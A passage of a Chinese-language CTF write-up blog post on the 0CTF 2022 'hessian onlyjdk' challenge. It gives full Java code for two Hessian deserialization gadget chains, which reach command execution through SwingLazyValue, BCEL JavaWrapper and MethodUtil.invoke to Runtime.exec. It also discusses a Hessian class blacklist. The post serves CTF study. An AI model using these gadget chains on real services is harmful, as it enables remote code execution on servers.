+        SwingLazyValue swingLazyValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SwingLazyValue</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.bcel.internal.util.JavaWrapper"</span><span class="token punctuation">,</span> <span class="token string">"_main"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        uiDefaults<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> swingLazyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        MimeTypeParameterList mimeTypeParameterList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MimeTypeParameterList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field parameters <span class="token operator">=</span> MimeTypeParameterList<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        parameters<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        parameters<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>mimeTypeParameterList<span class="token punctuation">,</span> uiDefaults<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        output<span class="token punctuation">.</span><span class="token function">getSerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>mimeTypeParameterList<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        output<span class="token punctuation">.</span><span class="token function">flushBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Hessian2Input input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>那句<code>output.flushBuffer();</code>似乎不能丢，不然可能写不进去？然后还有一个很大的坑点，就是IDEA调试的时候会在控制台打印变量，会自动toString显示的好看一点，而这里的链就是toString触发，似乎触发之后会直接把outputStream都给打乱，导致整个流乱七八糟的没法调试，关掉这个功能即可调试</p>
+<p>但是仔细跟一下可以看到bcel classloader使用的是loadClass，而不是forName去加载类，这样子就没法触发static段了，但是在类被加载之后又使用反射调用了类的<code>_main</code>方法，只需要给类里面加一个<code>_main</code>方法即可实现命令执行</p>
+<p>这里使用openjdk大概就是想利用这个bcel classloader，因为Oracle jdk高版本里面是没有这个类的</p>
+<h4 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h4><p>然后看到了0ops的师傅的另一个解法，这个是直接走的之前的equals这个入口<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/ceclin/0ctf-2022-soln-hessian-onlyjdk/blob/main/soln/src/main/kotlin/soln/App.kt">https://github.com/ceclin/0ctf-2022-soln-hessian-onlyjdk/blob/main/soln/src/main/kotlin/soln/App.kt</a><br>但是我不太看得懂kotlin，只能手动转java了</p>
+<pre class=" language-java"><code class="language-java">        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Hessian2Output output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        output<span class="token punctuation">.</span><span class="token function">getSerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        String cmd <span class="token operator">=</span> <span class="token string">"calc"</span><span class="token punctuation">;</span>
+        Method invoke <span class="token operator">=</span> MethodUtil<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> Method<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Method exec <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        SwingLazyValue swingLazyValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SwingLazyValue</span><span class="token punctuation">(</span>
+                <span class="token string">"sun.reflect.misc.MethodUtil"</span><span class="token punctuation">,</span>
+                <span class="token string">"invoke"</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>invoke<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>exec<span class="token punctuation">,</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>cmd<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        UIDefaults u1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UIDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        UIDefaults u2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UIDefaults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        u1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> swingLazyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        u2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> swingLazyValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        HashMap hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Class <span class="token class-name">node</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.HashMap$Node"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Constructor constructor <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object node1 <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> u1<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object node2 <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> u2<span class="token punctuation">,</span> null<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field key <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        key<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        key<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>node1<span class="token punctuation">,</span> u1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        key<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>node2<span class="token punctuation">,</span> u2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field size <span class="token operator">=</span> HashMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        size<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        size<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field table <span class="token operator">=</span> HashMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        table<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object arr <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> node1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Array<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> node2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        table<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        output<span class="token punctuation">.</span><span class="token function">flushBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Hessian2Input input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>想了半天怎么创建一个Node类的数组。。。然后最后去ysomap里面找了个例子缝了进来。。。。然后有一个师傅和我说他还是抄的我的，然后我那个时候是缝的marshal。。。我都忘了。。。因为我的智力条件你也知道.jpg</p>
+<p>然后看一下调用链</p>
+<pre><code>HashMap.equals
+    UIDefault.get
+    ......
+        SwingLazyValue.createValue
+            MethodUtil.invoke
+                MethodUtil.invoke
+                    Runtime.getRuntime.exec
+</code></pre>
+<p>这里中间部分还是UIDefault到SwingLazyValue，然后执行命令的部分换成了<code>sun.reflect.misc.MethodUtil</code>，触发的入口是HashMap的equals。。。感觉这个equals入口好像是很显而易见的东西。。。比较HashMap里面对k&#x2F;v调用get应该非常的普遍，还是基础差了</p>
+<p>这里比较有意思的是MethodUtil这里命令执行的构造，实际上是对MethodUtil.invoke进行了两次调用的，道理也很简单，因为<code>SwingLazyValue.createValue</code>方法中是通过传入参数的类型去获取方法的，如果传入的参数本身<code>Method.class, Object.class, Object[].class</code>就没法找到invoke方法，就无法实现调用了，所以先传入了<code>invoke, new Object(), new Object[]&#123;&#125;</code>，再在后续的object[]中传入Runtime执行命令。<br>但是这里有一点其实我没理解，这里的第二个参数应该是方法对应的类实例，第一次应该也是传入<code>MethodUtil</code>，但这样也会造成找不到方法的问题，为什么传入Object也能用呢？</p>
+<p>这里还有另一个点，就是exec获取的方法参数签名为String.class，但我们传入的时候应该是一个Object[]{cmd}，因为invoke要求输入参数是一个Object数组，如果想钓鱼String[].class的exec，就得传入Object[]{String[]{cmd}}</p>
+<p>然后这边还有一个坑，我一直以为Hessain应该没啥区别，所以没有用题目的jar包，直接pom里面引入Hessain本地调的，然后把payload搓出来之后打半天没反应。。。最后调了半天，走到第二次调用<code>MethodUtil</code>时，第二个参数本应该是Runtime类实例，结果给了我个HashMap？？？？最后和朋友调了半天发现我们俩payload完全一样，最后确认真的是Hessain的问题。。。在题目给的Hessain下可以正常反序列化出Runtime类，而本地的Hessain就不行。。。</p>
+<p>Hessain在SerializerFactory的getDeserializer中对类的Deserializer进行了判断，在我本地的Hessain4.0.65下，是一个</p>
+<pre class=" language-java"><code class="language-java">Class <span class="token class-name">cl</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">loadSerializedClass</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+deserializer <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeserializer</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>而这个方法最后会进ClassFactory的isAllow方法，里面写了个黑名单，一共四个值，首当其冲的就是<code>java.lang.Runtime</code>，类在黑名单里面就会返回一个HashMap对象。。。再对HashMap获取getDeserializer就会得到MapDeserializer，黑名单里面剩下三个是<code>java.lang.Process/System/Thread</code></p>
+<p>而对于题目中的Hessain这里就是</p>
+<pre class=" language-java"><code class="language-java">Class <span class="token class-name">cl</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+deserializer <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeserializer</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>可以直接获取到Runtime类然后使用UnsafeDeserializer反序列化。。。无语辣</p>
+<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>剩下的题估计是超越认知范围辣，不知道还会不会复现，我是Java垃圾呜呜</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/BalsnCTF2022web%20wp.html" rel="prev" title="BalsnCTF2022 web wp">
+      <i class="fa fa-chevron-left"></i> BalsnCTF2022 web wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/rCore_Tutorial_CP6&7&8.html" rel="next" title="rCore_Tutorial_CP6&7&8">
+      rCore_Tutorial_CP6&7&8 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0CTF2022%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">0CTF2022复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ohf"><span class="nav-number">1.1.</span> <span class="nav-text">ohf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%B6%E6%9E%81%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">1.1.1.</span> <span class="nav-text">究极非预期</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hessian-onlyjdk"><span class="nav-number">1.2.</span> <span class="nav-text">hessian onlyjdk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Hessain%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">Hessain反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">XStream反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hint%E7%9A%84XStream%E9%93%BE"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">Hint的XStream链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.2.2.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A31"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">解1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A32"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">解2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.3.</span> <span class="nav-text">坑</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">90</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
